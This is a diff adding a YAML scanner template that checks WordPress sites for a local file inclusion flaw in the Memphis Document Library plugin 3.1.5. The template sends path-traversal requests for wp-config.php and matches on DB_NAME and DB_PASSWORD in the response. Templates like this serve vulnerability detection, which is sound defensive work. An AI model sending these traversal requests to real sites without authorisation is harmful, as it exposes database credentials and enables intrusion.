@@ -1,0 +1,29 @@
+id: wp-memphis-documents-library-lfi
+name: WordPress Memphis Document Library 3.1.5 - Local File Inclusion
+severity: high
+confidence: tentative
+description: WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- wpscan
+- wordpress
+- wp-plugin
+- lfi
+- edb
+- vuln
+requests:
+- method: GET
+  path: /mdocs-posts/?mdocs-img-preview=../../../wp-config.php
+  matchers: &id001
+  - type: body
+    words:
+    - DB_NAME
+    - DB_PASSWORD
+  - type: status
+    status:
+    - 200
+  condition: and
+- method: GET
+  path: /?mdocs-img-preview=../../../wp-config.php
+  matchers: *id001
+  condition: and
